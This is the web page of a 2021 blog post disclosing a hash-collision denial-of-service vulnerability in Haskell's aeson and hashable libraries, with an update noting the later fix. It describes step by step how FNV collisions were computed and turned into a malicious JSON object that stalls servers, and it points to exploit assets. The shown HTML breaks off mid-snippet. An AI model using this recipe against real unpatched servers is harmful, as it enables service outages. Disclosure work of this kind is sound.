<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/x-icon" sizes="32x32" href="https://cs-syd.eu/logo/res/favicon.ico?etag=wjGsIbGF">
<title>CS SYD - JSON Vulnerability in Haskell&#39;s Aeson library</title>
<meta name="description" content="This blogpost describes a DoS vulnerability in Haskell&#39;s aeson package. We have followed appropriate procedure for responsible disclosure but the problem was not fixed, so now we are releasing this to the public in the hope that it may still be fixed afterall." />
<meta property="og:type" content="website">
<meta property="og:url" content="https://cs-syd.eu/posts/2021-09-11-json-vulnerability">
<meta property="og:title" content="JSON Vulnerability in Haskell&#39;s Aeson library">
<meta property="og:description" content="This blogpost describes a DoS vulnerability in Haskell&#39;s aeson package. We have followed appropriate procedure for responsible disclosure but the problem was not fixed, so now we are releasing this to the public in the hope that it may still be fixed afterall.">
<meta name="twitter:site" content="@kerckhove_ts">
<meta property="twitter:domain" content="https://cs-syd.eu/">
<meta property="twitter:url" content="https://cs-syd.eu/posts/2021-09-11-json-vulnerability">
<meta name="twitter:title" content="JSON Vulnerability in Haskell&#39;s Aeson library">
<meta property="twitter:description" content="This blogpost describes a DoS vulnerability in Haskell&#39;s aeson package. We have followed appropriate procedure for responsible disclosure but the problem was not fixed, so now we are releasing this to the public in the hope that it may still be fixed afterall.">
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","articleBody":"This blogpost describes a DoS vulnerability in Haskell's aeson package. We have followed appropriate procedure for responsible disclosure but the problem was not fixed, so now we are releasing this to the public in the hope that it may still be fixed afterall.2021-10-09 UpdateThe 2.0.1.0 version of aeson has fixed this vulnerability.SummaryThe aeson library is not safe to use to consume untrusted input, like the JSON values that a web server might parse. We have put together a DoS exploit to show that this is an immediate threat. We have spent the better part of a year talking to maintainers but did not manage to fix the vulnerability.OverviewThe aeson library uses HashMap from the unordered-containers library to deal with JSON Objects. The unordered-containers library uses the hashable library to deal with hashing for its HashMaps. It uses linear chaining to store collisions, which involves O(n) time insertions of collisions. The hashable library uses the FNV hash, which is not collision resistant. In fact it is very cheap to produce a lot of collisions, as we will see below. This means that unordered-containers, and by extension aeson in not safe to use with user-submitted input.By computing collisions on the FNV hash, we were able to produce a malicious JSON object that can keep a Haskell programm that consumes it using aeson busy for minutes.This blog post contains:The story of how we produced an exploitThe actual exploit and everything you need to reproduce itPotential solutionsStoryWhat follows here is an overview of how we found this vulnerability and constructed a malicious JSON object to exploit it.WarningThe hashable package contains a warning about the fact that hashable could be \"susceptible to 'hash DoS'\".hashable is used in unordered-containers and aeson, which are transitively used in security-critical applications. We decided to investigate the potential for a DoS attack.The attack vectorWe will specifically be looking into a practical attack on a Web server that accepts JSON, but this attack generalises to attacks on any application that assumes that the hashable package's hash function is collision-resistant. Such applications include usages of Data.HashMap.Strict.HashMap, Data.HashMap.Lazy.HashMap, Data.HashSet.HashSet, Data.Aeson.Value. Any application which builds up one of these data structures from arbitrary user-provided content may be vulnerable.Digging into Aeson valuesThe Data.Aeson.Value data type contains a Data.HashMap.Strict.HashMap in its Object constructor. These values are constructed using Data.HashMap.Strict.fromList, which uses Data.HashMap.Strict.unsafeInsert.The relevant piece of code is the following snippet:What's relevant here is that Data.HashMap.Strict.unsafeInsert uses Data.Hashable.hash, which is implemented as follows (by default):Note that Data.Hashable.hash calls Data.Hashable.hashWithSalt which uses Data.Hashable.defaultSalt, which has a known value:In the case of Data.Aeson.Value, the type parameter a will be Data.Text.Text. If we look at the implementation of Data.Hashable.Hashable Data.Text.Text, we see that hash is not overridden:This function uses Data.Hashable.hashByteArrayWithSalt, which directly calls out to a C function over the FFI:Now let's have a look at this C code. It can be found in the hashable repository in cbits/fnv.c.The relevant functions are called hashable_fnv_hash_offset and hashable_fnv_hash. Specifically, we are interested in this snippet:What happens here is that a state variable hash is initialised to the given salt: salt. For every byte in the array, the state is multiplied by a constant (16777619) and then XOR-ed with the next character in the bytestring. We will call this constant \"P\". It is called the FNV_prime in the spec.Now, we know that FNV is not a collision-resistant hash, so this is where the hunt for collisions starts.Hunt for collisionsFinding collisions of the FNV hash function has been done before. We found a blogpost that does exactly this. The blogpost is an interesting read, and I do recommend that you read it, but you can skip it on the first reading of this story. We will pick out the important bits. The important bits are:This is not a brute-force attack.The code to find the collisions is open-source and is available on GitHub.Someone commented that they were trying to attack hashable as well.We took the code from GitHub, and tried it out. We changed the constant that represents the length of the strings to find to something more managable like let n = 19 so that we could try running this quickly.We found two collisions:Note that these are strings of ascii characters that happen to represent numbers. They are not numbers. The specific character alphabet of [0-9] was chosen for reasons explained in the blogpost.Also note that these are collisions for a different hash function.To make sure that fnv-collider would find collisions for the hashable hash function, we would have to modify its code a bit.The primeThe Rust code in the fnv-collider contains a different prime than the prime that hashable uses.It uses 1000003, so we changed that to 16777619.The inverse of the primeThe next line mentions a constant called PINV. The previously mentioned comment asks about this constant, and the author responded that this was the multiplicative inverse of P. That was really helpful. We calculated the modular multiplicative inverse of 16777619 module 2^64 and set the PINV constant to that value (9778875398352553115).Collisions for hashableRunning fnv-collider again, gave us two collisions:We tried them out on the C code in a somewhat convoluted way. We added a main function to the bottom of cbits/fnv.c:When we compiled it and ran it, we saw that these two strings do indeed collide:Note that the last argument to hashable_fnv_hash is the salt, and is set to 0. The collisions that are being generated by fnv-collider are collisions only when 0 is used as the salt.Using fnv-collider like this would not get us collisions that we would be able to attack Data.HashMap.Strict.HashMap with, because it uses 0xdc36d1615b7400a4 as the salt.The starting stateWe had to change the collision generator again. This time, it was the starting state that we had to change. Specifically, the variable i which was set to 0 in a weird loop. We changed that line to the following:Collisions for the hashable hash functionWe ran fnv-collider again with let n = 20 and found the following collisions:We tried out these collisions in the C code:We found actual collisions against the hashable hash function:This seemed sufficient to warrant reporting to the hashable library maintainers. But we wanted to demonstrate a real exploit.Building an exploitTo construct an exploit, we were going to need a lot of these collisions. We knew that would take some time, so we started there.Finding many collisions.We launched an AWS m5.24xlarge spot instance that has 96 cores. We copied over the modified fnv-collider code with rsync, installed rustc and set it running with n = 20.We found a few collisions quickly, saved them, and set the collision generator running again with let n = 21. We did that until let n = 25, which is where the machine ran out of its 384 GiB of memory. The entire operation cost us a few dollars (single-digit) and took about three hours.In the meantime we started constructing an attack.Constructing an attack on a JSON web server.We made a minimal Haskell web server that would parse a JSON object and respond with Complete:This server can be run with ./Server.hs.Constructing a malicious JSON ObjectNext, we had to write a little piece of code that would take a file of newline-separated colliding strings, and turn it into a malicious JSON object.We will create a JSON object that has many key-value pairs where every key is a text value with hash 0, and every value is as small as possible. For the values, we chose 0 because it only requires a single byte. The resulting value will look something like the following.Colliding Text valuesTo make colliding Data.Text.Text values from the colliding strings, we have to reconsider how Data.Text.Text values are hashed:The raw bytes contained in the Data.Text.Text value are hashed as-is. The Data.Text.Text type stores a string of unicode characters in UTF-16 using the platform's native endianness. That means that just using Data.Text.pack on the collision strings will not produce colliding text values.We need to produce a text value, such that the UTF-16 encoding of the String that it represents is the given collision string. The way to do this, is to decode the given string using Data.Text.Encoding.decodeUtf16LE.Note that this can only ever succeed for even-length strings. For strings of odd lengths, we can just add an arbitrary byte to the end of the string. This works because of the fact that the output hash is the last state of the hashing process. If two values cause the same 'last state', then adding one more round using one more character will produce the same hash. Note that this adding of byte will probably change the hash value. However, if we use a zero byte, then the last round of the hashing process will multiply the hash (0) with the prime constant, and XOR the result with the zero-byte to produce 0 as the hash again.Extending colliding Text valuesGiven any Data.Text.Text value that hashes to zero, we can produce arbitrarily many more Data.Text.Text values that hash to zero by extending it using the above process.Note that extending a Data.Text.Text value with a zero-byte does use more space, so it may not be feasible to use only extended Data.Text.Text values in an attack. For this reason, we collect as many colliding Data.Text.Text values as we can and extend them only if we need even more of them and can afford using more space.NOTE Haskell web servers which consume JSON and do not place a limit on the request body size would be even more susceptible to a key-extension attack. However, this case is uninteresting, since such servers are already susceptible to a memory-exhaustion attack. Our goal in this attack is to maximise the number of keys that will fit into the arbitrary request body size limit.Creating a JSON ByteStringAt this point, all that is left before creating the JSON ByteString is to put the right separating characters around the colliding Data.Text.Text objects. Note that it is highly inefficient to construct a JSON ByteString using aeson via a Data.Aeson.Value because then we would be attacking ourselves.Non-problematic problemWe also generate a JSON Object that contains non-colliding strings, just to make sure we that we have a value to check the difference against.Completed ConstructionThe completed construction script looks as follows.This can be run using ./Construct.hs n_24.txt.Attacking ourselvesTo show the problem, first we start the server:Next, we generate the malicious JSON object:Then we can show the attack by uploading this JSON object using curl. First without the collisions and then with the collisions:withThis shows that for equally sized inputs, the input with collisions triggers quadratic processing time. As a result, we can keep a web server busy for minutes using a malicious five megabyte blob.This concludes the story of how we found a way to DoS most Haskell servers with a minimal amount of traffic and requests.AssetsList of colliding stringsMalicious JSON valueAn example vulnerable serverA program to turn colliding strings into a malicious JSON valueA program to construct a falsification for a \"vulnerable server\" hypothesisSolutionsThere are a few ways to fix this issue.Collision-resistant hashThe hashable package could use a collision-resistant hash, like perhaps SHA256 . Unfortunately this would most likely seriously impact the performance of the hashing operation, rendering the hashable package useless in favour of something like the cryptonite package.Random salt on startupA compounding factor of why it was so easy to produce an exploit is that the default hash salt that the hashable uses in its hash function is fixed. The library could use a different salt, generated at random every time a program starts. This is not a solution because the vulnerability is still there, even if you have to find the seed to produce an exploit. You may be able to find the salt by getting the server to hash an empty string, for example:There are also some other nasty side-effects of this solution, namely that the HashMap.toList would produce a potentially different ordering on every run of the program.Collisionless containersAs party of our investigation, we have come up with a new-ish approach to dealing with collisions. Instead of using linear chaining on collisions, we could instead recursively have the hashmap contain another hashmap that uses a different salt. This approach has been fully implemented and was ready to merge. The solution would strictly improve performance, at the cost of a minimal amount of extra memory in the case of a lot of collisions, without breaking backwards compatibility. However, it was rejected (privately) by two maintainers at the time because it does not come with a proof that it does not have any other vulnerabilities.Map instead of HashMapThe aeson library could have used Map in its definition of JSON values:This would cost performance, as well as memory usage. It would also break backward compatibility because Value and Object are part of aeson's external API.ReferencesThis document concerns the following pinned repositories:hashable at commit 3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0.unordered-containers at commit efa43a2ab09dc6eb72893d12676a8e188cb4ca63.aeson at commit 550b03d62021c93da58d40014280486d1c82726e.text at commit 9fac5db9b048b7d68fa2fb68513ba86c791b3630.fnv-collider at commit 10fd4d28abe7fb6c5428df8fe309dbfb0094530b.Links in this document are permanent links for posterity.ConclusionI would really like this problem to be fixed.In the meantime, developers:Do not expect hashable's hash function to be collision resistant.Use Map instead of HashMap and Set instead of HashSet for untrusted inputs.Do not use floating point numbers in a HashSet or as keys in a HashMap because two NaN values can form a trivial collision.Do not use aeson or yaml to parse untrusted inputs.Do not use aeson-based JSON-parsing Haskell web servers in situations where a DoS attack could cause trouble (like perhaps a 'proof of online stake' cryptocurrency).","author":{"@context":"https://schema.org","@type":"Person","affiliation":{"@context":"https://schema.org","@type":"Organization","logo":"https://cs-syd.eu/logo/res/positive/logo.svg?etag=pJBI-r4K","name":"CS SYD","url":"https://cs-syd.eu/company"},"name":"Tom Sydney Kerckhove","url":"https://cs-syd.eu/about"},"dateModified":"2021-09-11","image":[],"isPartOf":{"@context":"https://schema.org","@type":"WebSite","copyrightHolder":{"@context":"https://schema.org","@type":"Person","name":"Tom Sydney Kerckhove","url":"https://cs-syd.eu/about"},"copyrightNotice":"Copyright Tom Sydney Kerckhove (c) 2012-2024","copyrightYear":2012,"creator":{"@context":"https://schema.org","@type":"Person","name":"Tom Sydney Kerckhove","url":"https://cs-syd.eu/about"},"description":"CS SYD: Technical consulting in Leadership, Haskell, Nix, Rust; Self-management training, Sustainable Products, Speaking engagements and over 200 blog posts","headline":"CS SYD: Technical Consulting, Self-management and Blog","inLanguage":"English","keywords":["Leadership","Haskell","Nix","Rust","Self-management","Speaking","Blog"],"name":"CS SYD","producer":{"@context":"https://schema.org","@type":"Organization","logo":"https://cs-syd.eu/logo/res/positive/logo.svg?etag=pJBI-r4K","name":"CS SYD","url":"https://cs-syd.eu/company"},"url":"https://cs-syd.eu/"},"name":"JSON Vulnerability in Haskell's Aeson library","publisher":{"@context":"https://schema.org","@type":"Organization","founder":{"@context":"https://schema.org","@type":"Person","name":"Tom Sydney Kerckhove","url":"https://cs-syd.eu/about"},"logo":"https://cs-syd.eu/logo/res/positive/logo.svg?etag=pJBI-r4K","name":"CS SYD","url":"https://cs-syd.eu/company"},"url":"https://cs-syd.eu/posts/2021-09-11-json-vulnerability","wordCount":3396}</script><link rel="stylesheet" href="https://cs-syd.eu/style/res/index.css?etag=nWFN33-X"><link rel="stylesheet" href="https://cs-syd.eu/skylighting.css"><style>.navbar{margin-bottom:25px}</style><link rel="canonical" href="https://cs-syd.eu/posts/2021-09-11-json-vulnerability">

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-53296133-1"></script>
<script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-53296133-1');</script>
<script src="https://cs-syd.eu/assets-static/res/instantpage.js?etag=J_6LuB7H" type="module" defer></script>
<link rel="alternate" type="application/rss+xml" title="RSS Feed for CS SYD" href="https://cs-syd.eu/rss.xml">
<link rel="alternate" type="application/atom+xml" title="Atom Feed for CS SYD" href="https://cs-syd.eu/atom.xml">
</head>
<body><nav class="navbar is-spaced" role="navigation"><div class="navbar-brand"><a class="navbar-item" href="https://cs-syd.eu/"><img src="https://cs-syd.eu/logo/res/positive/logo.svg?etag=pJBI-r4K" alt="CS SYD Logo" width="128">
</a>
<div class="navbar-burger burger" data-target="navbarExampleTransparentExample"><span></span>
<span></span>
<span></span>
</div>
</div>
<div class="navbar-menu" id="navbarExampleTransparentExample"><div class="navbar-start"><a class="navbar-item" href="https://cs-syd.eu/">Services</a>
<a class="navbar-item" href="https://cs-syd.eu/blog">Blog</a>
<a class="navbar-item" href="https://cs-syd.eu/about">About</a>
</div>
</div>
</nav>

<section class="section"><div class="container"><div class="columns is-centered"><div class="column is-12-tablet is-11-desktop is-10-widescreen"><div class="box"><h1 class="title is-1">JSON Vulnerability in Haskell&#39;s Aeson library</h1>
<div class="field is-grouped is-grouped-multiline"><div class="control"><div class="tags has-addons"><a class="tag is-info" href="/posts/2016-06-05-estimated-reading-time-in-hakyll">ERT</a>
<a class="tag" href="/posts/2016-06-05-estimated-reading-time-in-hakyll">29 min</a>
</div>
</div>
<div class="control"><div class="tags has-addons"><span class="tag is-info">Date</span>
<span class="tag">2021-09-11</span>
</div>
</div>
<div class="control"><a class="tag" href="https://cs-syd.eu/tags/json">json</a>
</div>
<div class="control"><a class="tag" href="https://cs-syd.eu/tags/vulnerability">vulnerability</a>
</div>
<div class="control"><a class="tag" href="https://cs-syd.eu/tags/haskell">haskell</a>
</div>
<div class="control"><a class="tag" href="https://cs-syd.eu/tags/aeson">aeson</a>
</div>
<div class="control"><a class="tag" href="https://cs-syd.eu/tags/security">security</a>
</div>
</div>
<div class="content"><p>This blogpost describes a DoS vulnerability in Haskell&#39;s <code>aeson</code> package. We have followed appropriate procedure for responsible disclosure but the problem was not fixed, so now we are releasing this to the public in the hope that it may still be fixed afterall.</p><div></div><!--more-->
<small>
  Disclaimer: This story is the result of a team effort at FP Complete in 2018.
  I have received explicit written permission to post it here.
</small>
<h2>2021-10-09 Update</h2><p>The <code>2.0.1.0</code> version of <code>aeson</code> has fixed this vulnerability.</p><h2>Summary</h2><p>The <code>aeson</code> library is not safe to use to consume untrusted input, like the JSON values that a web server might parse. We have put together a DoS exploit to show that this is an immediate threat. We have spent the better part of a year talking to maintainers but did not manage to fix the vulnerability.</p><h2>Overview</h2><p>The <code>aeson</code> library uses <code>HashMap</code> from the <code>unordered-containers</code> library to deal with JSON Objects. The <code>unordered-containers</code> library uses the <code>hashable</code> library to deal with hashing for its <code>HashMap</code>s. It uses <a href="https://en.wikipedia.org/wiki/Hash_table#Linear_hashing">linear chaining</a> to store collisions, which involves <code>O(n)</code> time insertions of collisions. The <code>hashable</code> library uses the <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function">FNV hash</a>, which is not collision resistant. In fact it is very cheap to produce a lot of collisions, as we will see below. This means that <code>unordered-containers</code>, and by extension <code>aeson</code> in not safe to use with user-submitted input.</p><p>By computing collisions on the FNV hash, we were able to produce a malicious JSON object that can keep a Haskell programm that consumes it using <code>aeson</code> busy for minutes.</p><p>This blog post contains:</p><ul><li><p>The story of how we produced an exploit</p></li><li><p>The actual exploit and everything you need to reproduce it</p></li><li><p>Potential solutions</p></li></ul><h2>Story</h2><p>What follows here is an overview of how we found this vulnerability and constructed a malicious JSON object to exploit it.</p><h3>Warning</h3><p><a href="https://github.com/tibbe/hashable/tree/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0">The <code>hashable</code> package</a> contains <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable.hs#L81-L94">a warning</a> about the fact that hashable could be &quot;susceptible to &#39;hash DoS&#39;&quot;.</p><p><code>hashable</code> is used in <code>unordered-containers</code> and <code>aeson</code>, which are transitively used in security-critical applications. We decided to investigate the potential for a DoS attack.</p><h3>The attack vector</h3><p>We will specifically be looking into a practical attack on a Web server that accepts JSON, but this attack generalises to attacks on any application that assumes that the <code>hashable</code> package&#39;s hash function is collision-resistant. Such applications include usages of <code>Data.HashMap.Strict.HashMap</code>, <code>Data.HashMap.Lazy.HashMap</code>, <code>Data.HashSet.HashSet</code>, <code>Data.Aeson.Value</code>. Any application which builds up one of these data structures from arbitrary user-provided content may be vulnerable.</p><h3>Digging into Aeson values</h3><p>The <a href="https://github.com/bos/aeson/blob/master/Data/Aeson/Types/Internal.hs#L338-L351"><code>Data.Aeson.Value</code></a> data type contains a <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L177-L185"><code>Data.HashMap.Strict.HashMap</code></a> in its <code>Object</code> constructor. These values are constructed using <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L1708-L1712"><code>Data.HashMap.Strict.fromList</code></a>, which uses <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L782-L815"><code>Data.HashMap.Strict.unsafeInsert</code></a>.</p><p>The relevant piece of code is <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L786">the following snippet</a>:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="co">-- | In-place update version of insert</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="ot">unsafeInsert ::</span> (<span class="dt">Eq</span> k, <span class="dt">Hashable</span> k) <span class="ot">=&gt;</span> k <span class="ot">-&gt;</span> v <span class="ot">-&gt;</span> <span class="dt">HashMap</span> k v <span class="ot">-&gt;</span> <span class="dt">HashMap</span> k v</span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>unsafeInsert k0 v0 m0 <span class="ot">=</span> runST (go h0 k0 v0 <span class="dv">0</span> m0)</span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a>    h0 <span class="ot">=</span> hash k0</span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a>    [<span class="op">...</span>]</span></code></pre></div></div><p>What&#39;s relevant here is that <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L782-L815"><code>Data.HashMap.Strict.unsafeInsert</code></a> uses <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L233-L234"><code>Data.Hashable.hash</code></a>, which is implemented as follows (by default):</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="co">-- | Like &#39;hashWithSalt&#39;, but no salt is used. The default</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="co">-- implementation uses &#39;hashWithSalt&#39; with some default salt.</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="co">-- Instances might want to implement this method to provide a more</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a><span class="co">-- efficient implementation than the default implementation.</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="ot">hash ::</span> a <span class="ot">-&gt;</span> <span class="dt">Int</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a>hash <span class="ot">=</span> hashWithSalt defaultSalt</span></code></pre></div></div><p>Note that <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L233-L234"><code>Data.Hashable.hash</code></a> calls <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L205-L227"><code>Data.Hashable.hashWithSalt</code></a> which uses <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L192-L199"><code>Data.Hashable.defaultSalt</code></a>, which has a known value:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="co">-- | A default salt used in the implementation of &#39;hash&#39;.</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="ot">defaultSalt ::</span> <span class="dt">Int</span></span>
